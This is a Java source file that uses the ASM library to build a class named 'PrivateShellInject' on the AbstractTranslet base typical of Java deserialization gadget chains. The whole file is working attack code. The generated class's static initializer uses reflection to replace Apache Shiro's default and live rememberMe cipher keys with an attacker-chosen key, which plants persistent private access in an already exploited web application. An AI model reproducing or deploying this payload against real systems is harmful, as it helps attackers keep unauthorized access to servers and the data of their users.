package org.sec.core;

import org.springframework.asm.*;

import static org.springframework.asm.Opcodes.*;

public class Generator {
    public static byte[] getBytesCode(String newKey) {
        ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        FieldVisitor fieldVisitor;
        MethodVisitor methodVisitor;
        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, "sample/PrivateShellInject",
                null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", null);
        fieldVisitor = classWriter.visitField(ACC_PRIVATE | ACC_FINAL | ACC_STATIC, "newKey",
                "Ljava/lang/String;", null, newKey);
        fieldVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>",
                "()V", null, null);
        methodVisitor.visitCode();
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKESPECIAL,
                "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet",
                "<init>", "()V", false);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(1, 1);
        methodVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "transform",
                "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;" +
                        "[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V",
                null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        methodVisitor.visitCode();
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(0, 3);
        methodVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "transform",
                "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;" +
                        "Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;" +
                        "Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V",
                null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        methodVisitor.visitCode();
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(0, 4);
        methodVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_STATIC, "<clinit>",
                "()V", null, null);
        methodVisitor.visitCode();
        Label label0 = new Label();
        Label label1 = new Label();
        Label label2 = new Label();
        methodVisitor.visitTryCatchBlock(label0, label1, label2,
                "java/lang/Exception");
        methodVisitor.visitLabel(label0);
        methodVisitor.visitLdcInsn(Type.getType("Lorg/apache/shiro/mgt/AbstractRememberMeManager;"));
        methodVisitor.visitLdcInsn("DEFAULT_CIPHER_KEY_BYTES");
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class",
                "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
        methodVisitor.visitVarInsn(ASTORE, 0);
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitInsn(ICONST_1);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field",
                "setAccessible", "(Z)V", false);
        methodVisitor.visitLdcInsn(Type.getType("Ljava/lang/reflect/Field;"));
        methodVisitor.visitLdcInsn("modifiers");
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class",
                "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
        methodVisitor.visitVarInsn(ASTORE, 1);
        methodVisitor.visitVarInsn(ALOAD, 1);
        methodVisitor.visitInsn(ICONST_1);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field",
                "setAccessible", "(Z)V", false);
        methodVisitor.visitVarInsn(ALOAD, 1);
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field",
                "getModifiers", "()I", false);
        methodVisitor.visitIntInsn(BIPUSH, -17);
        methodVisitor.visitInsn(IAND);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field",
                "setInt", "(Ljava/lang/Object;I)V", false);
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitInsn(ACONST_NULL);
        methodVisitor.visitLdcInsn("4ra1n_Big_HacKeR");
        methodVisitor.visitFieldInsn(GETSTATIC, "java/nio/charset/StandardCharsets",
                "UTF_8", "Ljava/nio/charset/Charset;");
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "getBytes",
                "(Ljava/nio/charset/Charset;)[B", false);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field",
                "set", "(Ljava/lang/Object;Ljava/lang/Object;)V", false);
        methodVisitor.visitMethodInsn(INVOKESTATIC,
                "org/springframework/web/context/request/RequestContextHolder",
                "currentRequestAttributes",
                "()Lorg/springframework/web/context/request/RequestAttributes;", false);
        methodVisitor.visitTypeInsn(CHECKCAST,
                "org/springframework/web/context/request/ServletRequestAttributes");
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL,
                "org/springframework/web/context/request/ServletRequestAttributes",
                "getRequest", "()Ljavax/servlet/http/HttpServletRequest;", false);
        methodVisitor.visitMethodInsn(INVOKESTATIC,
                "org/springframework/web/servlet/support/RequestContextUtils",
                "findWebApplicationContext",
                "(Ljavax/servlet/http/HttpServletRequest;)" +
                        "Lorg/springframework/web/context/WebApplicationContext;", false);
        methodVisitor.visitVarInsn(ASTORE, 2);
        methodVisitor.visitLdcInsn("org.apache.shiro.web.mgt.CookieRememberMeManager");
        methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName",
                "(Ljava/lang/String;)Ljava/lang/Class;", false);
        methodVisitor.visitVarInsn(ASTORE, 3);
        methodVisitor.visitVarInsn(ALOAD, 2);
        methodVisitor.visitVarInsn(ALOAD, 3);
        methodVisitor.visitMethodInsn(INVOKEINTERFACE, "org/springframework/web/context/WebApplicationContext",
                "getBean", "(Ljava/lang/Class;)Ljava/lang/Object;", true);
        methodVisitor.visitVarInsn(ASTORE, 4);
        methodVisitor.visitLdcInsn(Type.getType("Lorg/apache/shiro/mgt/AbstractRememberMeManager;"));
        methodVisitor.visitLdcInsn("encryptionCipherKey");
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class",
                "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
        methodVisitor.visitVarInsn(ASTORE, 5);
        methodVisitor.visitVarInsn(ALOAD, 5);
        methodVisitor.visitInsn(ICONST_1);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field",
                "setAccessible", "(Z)V", false);
        methodVisitor.visitVarInsn(ALOAD, 5);
        methodVisitor.visitVarInsn(ALOAD, 4);
        methodVisitor.visitLdcInsn("4ra1n_Big_HacKeR");
        methodVisitor.visitFieldInsn(GETSTATIC, "java/nio/charset/StandardCharsets",
                "UTF_8", "Ljava/nio/charset/Charset;");
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "getBytes",
                "(Ljava/nio/charset/Charset;)[B", false);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "set",
                "(Ljava/lang/Object;Ljava/lang/Object;)V", false);
        methodVisitor.visitLdcInsn(Type.getType("Lorg/apache/shiro/mgt/AbstractRememberMeManager;"));
        methodVisitor.visitLdcInsn("decryptionCipherKey");
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField",
                "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
        methodVisitor.visitVarInsn(ASTORE, 6);
        methodVisitor.visitVarInsn(ALOAD, 6);
        methodVisitor.visitInsn(ICONST_1);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field",
                "setAccessible", "(Z)V", false);
        methodVisitor.visitVarInsn(ALOAD, 6);
        methodVisitor.visitVarInsn(ALOAD, 4);
        methodVisitor.visitLdcInsn("4ra1n_Big_HacKeR");
        methodVisitor.visitFieldInsn(GETSTATIC, "java/nio/charset/StandardCharsets",
                "UTF_8", "Ljava/nio/charset/Charset;");
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String",
                "getBytes", "(Ljava/nio/charset/Charset;)[B", false);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field",
                "set", "(Ljava/lang/Object;Ljava/lang/Object;)V", false);
        methodVisitor.visitLabel(label1);
        Label label3 = new Label();
        methodVisitor.visitJumpInsn(GOTO, label3);
        methodVisitor.visitLabel(label2);
        methodVisitor.visitVarInsn(ASTORE, 0);
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Exception",
                "printStackTrace", "()V", false);
        methodVisitor.visitLabel(label3);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(4, 7);
        methodVisitor.visitEnd();
        classWriter.visitEnd();
        return classWriter.toByteArray();
    }
}
